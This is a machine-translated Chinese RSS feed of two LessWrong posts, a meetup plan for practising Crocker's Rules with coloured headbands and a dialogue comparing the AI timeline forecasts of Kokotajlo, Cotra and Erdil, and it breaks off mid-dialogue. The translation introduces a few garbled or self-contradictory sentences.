<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/"><channel><title><![CDATA[LessWrong]]></title><description><![CDATA[A community blog devoted to refining the art of rationality]]></description><link/> https://www.lesswrong.com<image/><url> https://res.cloudinary.com/lesswrong-2-0/image/upload/v1497915096/favicon_lncumn.ico</url><title>少错</title><link/>https://www.lesswrong.com<generator>节点的 RSS</generator><lastbuilddate> 2023 年 11 月 10 日星期五 06:15:51 GMT </lastbuilddate><atom:link href="https://www.lesswrong.com/feed.xml?view=rss&amp;karmaThreshold=2" rel="self" type="application/rss+xml"></atom:link><item><title><![CDATA[Crock, Crocker, Crockiest]]></title><description><![CDATA[Published on November 10, 2023 6:14 AM GMT<br/><br/><p><strong>摘要</strong>：如果您声明自己按照克罗克规则进行操作，那么其他人就可以优化向您发送的消息，以获取信息，而不是为了对您友善。克罗克规则的反面是要求人们优化他们向你传达的信息，是为了对你友善，而不是为了提供信息。这两种沟通方式都很有用，您将有机会练习这两种方式。</p><p><strong>标签</strong>：可重复、投资、高度实验性</p><p><strong>目的</strong>：有四种技能。 1. 优化与他人的沟通，使其信息丰富。 2. 优化与他人的沟通，让自己变得友善。 3. 收到的沟通根本没有优化为友善。 4. 收到的通讯根本没有经过优化以提供信息。这提供了练习这些内容的机会。</p><p><strong>材料</strong>：您需要某种清晰可见的标记，至少具有三种明显不同的样式。蓝色、绿色和红色头巾是一种选择。大贴纸是另一种情况，但请注意，人们会在整个聚会期间移除并重新粘贴它们，因此这些贴纸自然会失去粘合剂。</p><p><strong>公告文字</strong>：“这可能确实是不礼貌的；我不否认这一点。这是否不真实是另一个问题。 ——埃莱泽·尤德科夫斯基</p><p>克罗克规则（Crocker&#39;s Rules），以李·丹尼尔·克罗克（Lee Daniel Crocker）的名字命名并由他制定，是一种社会规范，你可以声明你正在使用它，你授权其他人优化他们的信息以获取信息而不是友善。换句话说，通过说你遵循克罗克规则，你是在说你希望人们对你说实话，即使这些话可能很粗鲁，以实现有效的沟通。</p><p>对于某些人来说，与使用克罗克规则的人交谈可能会感到不舒服和奇怪！如果你通常是一个有礼貌的人，尽量不让别人不高兴，那么说出真实而粗鲁的话感觉就像是刻薄。说不礼貌的真话是一种技能，这次聚会可能会提供练习该技能的机会。</p><p>还有一项技能是一些追随克罗克旗下的人并没有熟练掌握的。礼貌和遵守当地礼仪的能力也是一项有用的实用技能。我们也希望有机会实践<i>这一点</i>，虽然这不是一种明显的理性主义技能，但无论如何它都是值得拥有的。</p><p><strong>描述</strong>：人员聚集后，阅读<a href="http://sl4.org/crocker.html">SL4 克罗克规则</a>帖子的文本。</p><blockquote><p> “宣称自己遵守“克罗克规则”意味着其他人可以为了信息而优化他们的消息，而不是为了对你好。克罗克规则意味着你已经对自己的思维运作承担全部责任——如果你被冒犯了，那是你的错。任何人都可以称你为白痴并声称要帮你一个忙。 （事实上​​，他们确实会这样。这种文化的一个大问题是，每个人都不敢告诉你你错了，或者他们认为他们必须绕着它跳舞。）使用克罗克规则的两个人应该是能够在最短的时间内传达所有相关信息，无需释义或社交格式。显然，除非你有这种精神纪律，否则不要宣称自己遵守克罗克规则。</p><p><strong>请注意，克罗克规则并不</strong><i><strong>意味着</strong></i><strong>您可以侮辱他人；相反，您可以侮辱他人。这意味着</strong><i><strong>其他</strong></i><strong>人不必担心</strong><i><strong>他们</strong></i>是否<strong>在侮辱</strong><i><strong>你</strong></i><strong>。</strong>克罗克规则是一种纪律，而不是一种特权。此外，利用克罗克规则并不意味着互惠。怎么可能呢？克罗克规则是你为自己做的事情，目的是最大化收到的信息——<i>而不是</i>你咬紧牙关并作为一个人情而做的事情。</p><p> “克罗克规则”是以李·丹尼尔·克罗克的名字命名的。</p><p> ——埃利泽·尤德科夫斯基</p></blockquote><p>接下来，重复粗体部分。暂停。再次重复粗体部分。</p><p>现在分发可见标记。 （此描述假设您使用的是头巾。）确保每个想要头巾的人都可以拥有一个。 “大家看到头巾了吗？好的。看他们。有人分不清他们之间的区别吗？” （你应该听到齐声说“不”。）“好！”</p><p> “这就是它的运作方式。如果您想使用克罗克规则，请戴上黄色头带 - 您可以将其系在头上或手腕上，或者只是将其塞入夹克拉链中。这意味着其他人与你交流时应该优化信息，而不是友善。如果您想使用反向克罗克规则，请戴上绿色头带。这意味着其他人与你交流时应该以友善而不是信息为目的。如果你很乐意成为一名向导——也就是说，向某人提供如何变得更好或更了解更多信息的建议，同时牢记他们所戴的头带——那么除了你所戴的头巾之外，还可以戴上一条白色头巾穿着。您可以随时摘下头巾。如果你只是拿着它，那就没有任何意义。检查头巾是否刚刚被握住，或者是否被佩戴。我在此声明，询问某人是否戴着头巾或只是拿着它总是很好的，并且总是提供信息。”</p><p> “你的目标是今晚尝试与克罗克人和反克罗克人交谈。你谈论什么取决于你。完成后，请把头巾还给我！”</p><p>谈话结束后，收起头巾，然后互相鞠躬。感谢那些佩戴它们帮助人们学习的人。</p><p><strong>变体：</strong>所以这个标题是一个笑话，关于英语中的“Crocker”听起来应该意味着“more crock”。比较“重，重，最重”。我想尝试的一件事是改变人们使用的“Crock”（由于缺乏更好的术语）的数量。也许头巾的位置表明了你在多大程度上鼓励人们放弃礼貌以追求有效的沟通，将头巾绑在手腕上表示优化友好，肘部绑在正常对话上，肩膀上表示优化有效信息。在实践中，这很棘手，因为头巾往往会向下滑动，而且（更难解决）人们不太擅长精确校准直接程度。 80% 克罗克和 70% 克罗克之间的差异很难瞄准，特别是考虑到人际差异。克罗克规则是绝对的——你可以当面称某人为白痴，也可以说这是对他们的恩惠！——而且这是一个更容易的目标。尽管如此，我认为能够慢慢提高直接程度，让人们感到温暖，并给他们一个尝试的机会，这将是有用的。</p><p>这次聚会的第一个版本涉及使用房间中的位置来指示要优化的友善程度和真实程度。比如说，让北墙最大克罗克，南墙最大反向克罗克。这样做的问题是，要与最大克罗克的某人交谈，你自己必须深入克罗克一方。事情不是这样的。同样，随着时间的推移，事情会发生变化（所以事件开始时是正常的，然后在半小时内逐渐变得更好，直到达到峰值，然后逐渐恢复正常，然后在半小时内逐渐变得更克罗克，直到达到峰值）正在发生让那些还没有准备好接受克罗克规则的人进入这种模式。</p><p>我确实认为有办法尝试一下克罗克规则是件好事。如果你没有在自己的头脑中做一堆看不见的、个人的工作，然后准备好接受“对自己头脑的运作承担全部责任”，那么要么成功，要么失败，要么生气，我不知道这是怎么回事被教导和学习。令人沮丧的是，显而易见的练习方法是让某人调整他们向您发送的消息，以优化您逐渐适应接收克罗克规则风格的消息，而这并不是克罗克规则应该意味着的意思！</p><p><strong>注意</strong>：看到“高度实验性”标签了吗？这并非偶然，而是一项未经尝试的工作正在进行中。</p><p>首先，征求关于如何称呼“美好>;信息”而不是“反向克罗克”的建议。这是一个糟糕的命名法，但我没有更好的主意。</p><p>可能没有人愿意接受克罗克规则，这几乎让这次可能的聚会陷入困境。你不想征召无法与他们一起作战的人，因为这对他们来说非常不愉快，而且他们的人数越少，情况可能会更糟。 （一个人对你做出你认为粗鲁的行为是不好的。一屋子人这样做更糟糕，而且不是以线性或可预测的方式进行。）如果你是一个感到舒服的人，那么这聚会更可行。</p><p>尤其是担任向导的角色，我认为与某人合作时切换几次模式会很有用。让你的对话者习惯克罗克规则，不是他们总是如何与你互动以及你的个人怪癖，而是作为一种他们可以通过代码切换进出的方言。</p><p>留意那些认为自己佩戴克罗克规则标志的人，他们会对其他人粗鲁和直接。他们只是在事实上错了，而且他们也是最后一个可以抱怨你告诉他们他们在事实上错了的人。</p><p>我确实认为，以牺牲有效信息交换为代价来练习与人友善是一种人们可以从练习中受益的技能。我在这里并不是说这是一项重要且核心的理性技能。我认为与克罗克规则并列进行是有用的，因为对比可以提供丰富的信息。此外，针对信息的优化与针对伤害某人感情的优化不同，虽然克罗克规则明确允许称某人为白痴，但“嘿，你白痴，你在家里忘记脱鞋了”并不是发送信息的最有效方式。该信息。那将是“你忘了在家里脱鞋”，除非这种侮辱在某种程度上有帮助，而我通常不认为它有帮助。</p><p>当他们还没有准备好并受到情感伤害时，肯定有人会尝试披上克罗克规则的外衣。我不知道如何避免这种情况。征求有关本次锻炼的可鼓励和支持的想法的建议。</p><p><strong>致谢</strong>：《克罗克规则》来自 Daniel Lee Crocker。我第一次遇到的书面形式是 Yudkowsky 引用 SL4 帖子。我个人从 2022 年的 LessWrong 社区周末中得到了一个明确的信号来选择加入克罗克规则（你可以在你的名牌上贴上的特殊贴纸）的想法。欢迎在午餐时充当参谋的 LessWrong 用户如果他们愿意，或者可能希望避免与这场即将发生的灾难联系在一起，就可以得到认可。</p><br/><br/><a href="https://www.lesswrong.com/posts/BcCeyL89cKSqcjtL5/crock-crocker-crockiest#comments">讨论</a>]]>;</description><link/> https://www.lesswrong.com/posts/BcCeyL89cKSqcjtL5/crock-crocker-crockiest<guid ispermalink="false"> BCCeyL89cKSqcjtL5</guid><dc:creator><![CDATA[Screwtape]]></dc:creator><pubDate> Fri, 10 Nov 2023 06:14:27 GMT</pubDate> </item><item><title><![CDATA[AI Timelines]]></title><description><![CDATA[Published on November 10, 2023 5:28 AM GMT<br/><br/><h1>介绍</h1><p>变革性人工智能还需要多少年才能建成？对这个问题思考了很多的三个人是来自<a href="https://www.openphilanthropy.org/">Open Philanthropy</a>的 Ajeya Cotra、来自<a href="https://openai.com/">OpenAI</a>的 Daniel Kokotajlo 和来自<a href="https://epochai.org/">Epoch</a>的 Ege Erdil。他们各自花费了<i>数百</i>个小时来研究和预测人工智能发展何时可能会产生巨大影响，但他们对相关时间尺度存在严重分歧。例如，以下是他们实施变革性人工智能的中位时间表。 </p><figure class="table"><table style="border:0px solid hsl(0, 0%, 100%)"><thead><tr><th style="border:0px solid hsl(0, 0%, 100%);text-align:center" colspan="2"><p><strong>当前 99% 的中值估计</strong></p><p><strong>完全远程工作将实现自动化</strong></p></th></tr></thead><tbody><tr><td style="border:0px solid hsl(0, 0%, 100%);text-align:center">丹尼尔</td><td style="border:0px solid hsl(0, 0%, 100%);text-align:center">4年</td></tr><tr><td style="border:0px solid hsl(0, 0%, 100%);text-align:center">阿杰亚</td><td style="border:0px solid hsl(0, 0%, 100%);text-align:center">13年</td></tr><tr><td style="border:0px solid hsl(0, 0%, 100%);text-align:center">埃格</td><td style="border:0px solid hsl(0, 0%, 100%);text-align:center">40年</td></tr></tbody></table></figure><p>您可以在下图中看到他们分歧的强度，其中他们对与 AGI 开发相关的两个问题给出了截然不同的概率分布。 </p><figure class="table"><table style="border:0px solid hsl(0, 0%, 100%)"><tbody><tr><td style="border:0px solid hsl(0, 0%, 100%);text-align:center"><strong>人工智能系统会在哪一年出现？</strong><br><strong>能够取代目前 99% 的完全远程工作吗？</strong> </td></tr></tbody></table></figure><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/kzksnas7qpbb02twb573" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/x5ooeyjjkbmr0zewb6r5 550w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/jbrfgwzbc0iq6amz3iet 1100w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/qujr8mhztjp8ugqsvbhy 1650w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/sjlqwtgqkfymaaaqecy7 2200w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/dipfjc1gbqieubrm0cpo 2750w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/suujprewmfj7uevwcz3f 3300w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/fpqna0v3ingftmmzf47b 3850w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/vic2xwlvevudbc1lcfpe 4400w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/zwzqdp6ocv4tkotvwonc 4950w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/dhw6gxwmgdzp99ptolns 5497w"></figure><figure class="table"><table style="border:0px solid hsl(0, 0%, 100%)"><tbody><tr><td style="border:0px solid hsl(0, 0%, 100%);text-align:center"><strong>哪一年的能源消耗量</strong><br><strong>人类或其后代会比现在强大 1000 倍吗？</strong> </td></tr></tbody></table></figure><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/dgluluai77tpabbjl6vp" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/gghyhdlpqvkftxbbkxwu 570w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/m6vn1o3xguil21rzm89p 1140w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/jgy5taicz50nnbiwsg4s 1710w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/dqg6vfx5jzbkbyrvzvz6 2280w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/t9c00topcmmoqrrowxz6 2850w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/qkcozi5f3u6swey2rccx 3420w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/ozvbxotplbmhxixrfh4t 3990w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/gpwhggifjrcsbdkzzc9h 4560w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/xwrgkbhhtxei1aqs23ja 5130w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/wqq4xog2wv7d7gyvoegj 5603w"><figcaption>中位数由小虚线表示。请注意，Ege 的中位数超出了 2177 的范围</figcaption></figure><p>所以我邀请他们谈谈他们的分歧所在。我们坐下来花了三个小时写对话。您可以阅读下面的讨论，我个人从中学到了很多东西。</p><p>对话大致分为两部分，第一部分集中在阿杰亚和丹尼尔之间的分歧，第二部分集中在丹尼尔/阿杰亚和埃格之间的分歧。</p><p>我现在将总结讨论，但您也可以直接跳入。</p><h1>对话概要</h1><h2>他们的模型的一些背景</h2><p>Ajeya 和 Daniel 正在使用以计算为中心的模型进行 AI 预测，Ajeya 的<a href="https://www.lesswrong.com/posts/KrJfoZzpSDpnrv9va/draft-report-on-ai-timelines">AI 时间线报告草稿</a>和<a href="https://www.lesswrong.com/posts/Gc9FGtdXhK9sCSEYu/what-a-compute-centric-framework-says-about-ai-takeoff">Tom Davidson 的起飞模型</a>说明了这一点，其中“何时实现变革性 AI”的问题被简化为“获得 AGI 和实现 AGI 需要多少计算量”。我们什么时候才能拥有那么多计算能力？（将算法进步建模为必要计算的减少）”。</p><p>然而 Ege 认为此类模型在我们的预测中应该具有很大的分量，但它们可能会错过重要的考虑因素，并且没有足够的证据来证明其做出的非凡预测是合理的。</p><h2> Habryka 的 Ajeya 和 Daniel 讨论概述</h2><ul><li>Ajeya 认为将人工智能功能转化为商业应用的速度比预期要慢（“<i>似乎 2023 年带来了我在 2021 年天真想象的酷产品水平</i>”），并且同样认为在人工智能系统能够实现之前，还有很多问题需要解决。大幅加速人工智能发展。</li><li>丹尼尔同意，有影响力的商业应用程序比预期要慢，但他也认为导致速度慢的部分可以基本上实现自动化，并且很多复杂性来自于交付对普通消费者有用的东西，以及对应用程序有用的东西在公司内部，可以更快地释放这些功能。</li><li>计算过剩也在 Ajeya 和 Daniel 的时间表之间的差异中发挥了重要作用。目前，只需在可用的计算上投入更多资金，就有很大的空间来扩展人工智能。然而，在几年内，进一步增加训练计算量将需要加速半导体供应链，这可能无法通过花费更多资金来轻松实现。这造成了“计算过剩”，在短期内大大加速了人工智能的进步。丹尼尔认为，在计算能力耗尽之前，我们很有可能获得变革性的人工智能。阿杰亚认为这似乎是合理的，但总的来说，这更有可能发生在之后，这大大拓宽了她的时间表。</li></ul><p>这些分歧可能解释了丹尼尔和阿杰亚时间表上的一些差异，但不是大部分。</p><h2> Habryka 对 Ege 和 Ajeya/Daniel 讨论的概述</h2><ul><li>Ege认为丹尼尔的预测留给霍夫施塔特定律的空间很小（“即使考虑到霍夫施塔特定律，它总是比你预期的要长”），而且一般来说，会出现一堆意想不到的事情出错。变革性人工智能之路</li><li>丹尼尔认为霍夫施塔特定律不适合趋势外推。也就是说，看看摩尔定律并说“啊，由于计划谬误，这张图的斜率从今天开始是以前的一半”是没有意义的</li><li>Ege 和 Ajeya 都预计未来几年迁移学习能力不会大幅提高。对于 Ege 来说，这很重要，因为这是人工智能无法大幅加快经济和人工智能发展的主要原因之一。 Ajeya 认为，无论如何，我们都可以通过让人工智能不具备人类那样的传输能力来加速人工智能研发，但它确实擅长机器学习工程和人工智能研发，因为它是经过直接训练的。</li><li> Ege 预计人工智能将对经济产生重大影响，但很可能存在持续性缺陷，阻碍人工智能研发完全自动化或大幅加速半导体进步。</li></ul><p>总体而言，人工智能是否会在迁移学习方面取得显着的进步（例如，看到人工智能在一种类型的视频游戏上接受训练，然后很快学会玩另一种类型的视频游戏）将使所有参与者大大缩短时间。</p><p>我们结束了与 Ajeya、Daniel 和 Ege 的对话，并给出了各种 AGI 里程碑将导致他们更新时间表的数字（以及 Daniel 提出的具体里程碑）。时间限制使得我们很难深入研究，但我和丹尼尔很高兴能够充实 AGI 如何发挥作用的更具体场景，然后收集更多关于人们在这种场景下如何更新的数据。</p><h1>对话</h1><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sun, 29 Oct 2023 17:22:26 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sun, 29 Oct 2023 17:22:26 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>哈布里卡</b></section><div><p>Daniel、Ajeya 和 Ege 在“人工智能多久才能真正成为一件大事？”这个问题上似乎存在很大分歧。因此，今天我们留出几个小时来尝试深入探讨这种分歧，以及你们观点之间最可能的症结所在。</p><p>为了让事情脚踏实地并确保我们不会互相误解，我们将从两个相当易于操作的问题开始：</p><ol><li>哪一年人工智能系统能够取代目前 99% 的完全远程工作？ （从<a href="https://docs.google.com/presentation/d/1Rjnyl-jeaCTzmul9L-7A2gYJXUh9srcg6V0ONyPGft4/edit#slide=id.p">Ajeya 分享的人工智能预测幻灯片</a>中窃取了可操作性）</li><li>到哪一年，人类或其子孙的能源消耗量将比现在增加 1000 倍？</li></ol><p>当然，这些都离人工智能风险的完美运作还很远（我认为对于大多数人来说，这两个问题都比他们对“你的时间表有多长？”的答案更遥远），但我的猜测是这会很好足以引出你们模型中的大部分差异，并清楚地表明确实存在分歧。</p></div></section><h2>视觉概率分布</h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sun, 29 Oct 2023 17:22:26 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sun, 29 Oct 2023 17:22:26 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>哈布里卡</b></section><div><p>首先，这是你们的概率分布的两张图： </p><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/gkorp85zmipz4s64yh4y" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/sznehrdhsfht3euhrb4l 550w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/tye1xevxurl2qvlj9teo 1100w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/s3sycw4tqvv7yrzyw68d 1650w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/frh1ttp4jevhfnq19eso 2200w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/eeapu1uduw5pjse4c7fu 2750w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/i0jmvrazsil7ev8ccyz0 3300w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/kjj4ajpma4ngobdgwdux 3850w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/qln2f1q51g7jpho2itta 4400w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/w5u4zpkq9uyapwcowdz5 4950w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/qfi9sszguck2onei1oy4 5497w"><figcaption><strong>​什么时候 99% 的完全远程工作将实现自动化？</strong> </figcaption></figure><figure class="image"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/vabqfpmnwrcb5vht3qa9" srcset="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/r2yrjysrwy9xxgap2zdb 570w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/wuslgsdo6stnca2zr9bl 1140w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/yyfzgooeeqkhtwlcarlt 1710w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/d0yycia21vyuzwxsqqaz 2280w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/yr3kqedmtu9uukhlbcgt 2850w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/z2odotlzjnkauqsx502j 3420w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/wwgg2tfavqddqlt6qrvs 3990w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/fgq6uxeosgb2tazlwsyr 4560w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/eh9qr7htcy7mwpzzbqg7 5130w, https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/K2D45BNxnZjdpSX2j/wtpir1tpd3zqijoqg2ys 5603w"><figcaption><strong>我们什么时候会消耗1000倍的能量？</strong></figcaption></figure></div></section><h2>开场陈词</h2><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sun, 29 Oct 2023 17:22:26 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sun, 29 Oct 2023 17:22:26 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>哈布里卡</b></section><div><p>好的，让我们开始吧：</p><p><strong>您对另外两个人最不同意您的哪种信念的猜测是什么</strong>，<strong>这可能解释了您的预测中的一些分歧？</strong></p></div></section><h3><strong>丹尼尔</strong></h3><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 17:27:16 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 17:27:16 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>丹尼尔·科科塔洛</b></section><div><p>我还不太理解Ege的观点，所以我没有太多要说的。相比之下，对于我与阿杰亚不同的地方，我有很多话要说。简而言之：我的训练计算需求分布的中心位置比 Ajeya 的 OOM 低一些。为什么？出于多种原因，但是（a）我对与人脑的比较不像她（或比我以前！）那么热心，并且（b）我对<a href="https://www.lesswrong.com/posts/BGtjG6PzzmPngCgW9/revisiting-the-horizon-length-hypothesis">视界长度假设</a>不太热衷/我认为大对短期任务进行大量训练，并结合对长期任务进行少量训练，将会发挥作用（也许经过几年的修修补补）。 </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="XtphY3uYHwruKqDyG-Sat, 04 Nov 2023 17:41:47 GMT" user-id="XtphY3uYHwruKqDyG" display-name="habryka" submitted-date="Sat, 04 Nov 2023 17:41:47 GMT" user-order="1"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>哈布里卡</b></section><div><p>Daniel：澄清一下，听起来您大致同意以计算为中心的人工智能预测方法？比如说，预测的关键变量是获得 AGI 需要多少计算量，也许可以对算法进度进行一些调整，但不是很多？</p><p>像“人工智能在不同的视野长度上表现良好”这样的事情是如何发挥作用的（你也提到这是潜在的分歧领域之一）？</p><p> <i>（致读者：视野长度假设是，任务的反馈循环越长，人工智能就越难擅长这项任务。</i></p><p><i>在一端平衡扫帚的反馈循环不到一秒。 “经营一家公司”的任务有逐年的长反馈循环。我们的假设是，我们需要更多的计算才能获得在第二个方面比第一个方面更好的人工智能。另请参阅</i><a href="https://www.alignmentforum.org/posts/BoA3agdkAzL6HQtQP/clarifying-and-predicting-agi#The_t_AGI_framework"><i>Richard Ngo 的 t-AGI 框架</i></a><i>，该框架假设人工智能通常是智能的领域将逐渐从短时间范围扩展到长时间范围。）</i> </p></div></section><section class="dialogue-message ContentStyles-debateResponseBody" message-id="YLFQfGzNdGA4NFcKS-Sat, 04 Nov 2023 17:44:36 GMT" user-id="YLFQfGzNdGA4NFcKS" display-name="Daniel Kokotajlo" submitted-date="Sat, 04 Nov 2023 17:44:36 GMT" user-order="2"><section class="dialogue-message-header CommentUserName-author UsersNameDisplay-noColor"><b>丹尼尔·科科塔洛</b></section><div><p>是的，我认为 Ajeya 的模型（特别是 Davidson &amp; Epoch 扩展的版本）是我们当前最好的 AGI 时间线和起飞速度模型。我对此有很多批评，但这基本上是我的出发点。我有资格这么说，因为我在2020年刚开始研究这个话题并形成自己独立印象时，实际上确实考虑过六种不同的模型，而且我想得越多我越觉得其他型号更糟糕。其他模型的例子：<a href="https://aiimpacts.org/2022-expert-survey-on-progress-in-ai/">对人工智能科学家进行民意调查</a>， <a href="https://www.lesswrong.com/posts/L23FgmpjsTebqcSZb/how-roodman-s-gwp-model-translates-to-tai-timelines">按照鲁德曼的方式推断世界生产总值（GWP）</a> ，遵循<a href="https://forum.effectivealtruism.org/posts/Go5CDwyna3hAfngKP/no-the-emh-does-not-imply-that-markets-have-long-agi">股票市场的暗示</a>， <a href="https://www.lesswrong.com/posts/h3ejmEeNniDNFXTgp/fractional-progress-estimates-for-ai-timelines-and-implied">汉森奇怪的分数进步模型</a>，<a href="https://epochai.org/blog/grokking-semi-informative-priors">半信息性的</a>先验<a href="https://aipriors.com/">模型......</a><a href="https://epochai.org/blog/grokking-semi-informative-priors"> </a>我仍然对其他模型给予一定的重视，但不多。<br><br>至于地平线长度问题：这会反馈到训练计算需求变量中。 IIRC Ajeya 的原始模型对于短、中和长范围有不同的桶，其中例如中范围桶大致意味着“是的，我们将进行短范围和长范围训练的组合，但平均而言它将是中等范围” -地平线训练，使得计算成本将是例如[推理失败]*[数万亿个数据点，根据应用于大于人脑模型的缩放定律]*[4-6 OOMs 秒的主观体验每个数据点平均]<br><br>因此，Ajeya 的大部分训练都集中在中、长视野范围内，而我更看好大部分训练可能是短视野，而只是长视野的“顶部樱桃”。从数量上来说，我在想“假设你有 100T 下一时刻预测的数据点，作为你的短视野预训练的一部分。我声称你可能只需要百万秒长任务的 100M 数据点，或者较少的。”<br><br>对于我为什么这么认为的一些直觉，阅读<a href="https://www.lesswrong.com/posts/rzqACeBGycZtqCfaX/fun-with-12-ooms-of-compute">这篇文章</a>和/或<a href="https://www.lesswrong.com/posts/BoA3agdkAzL6HQtQP/clarifying-and-predicting-agi?commentId=Bs9sKmzhNvSPAs3yY">这篇评论线程可能会有所帮助。</a></p></div></section><h3><strong>埃格</strong></h3><section class="dialogue-message ContentStyles-debateResponseBody" message-id="5y2XiEs9AKBnnpSx7-Sat, 04 Nov 2023 17:35:24 GMT" 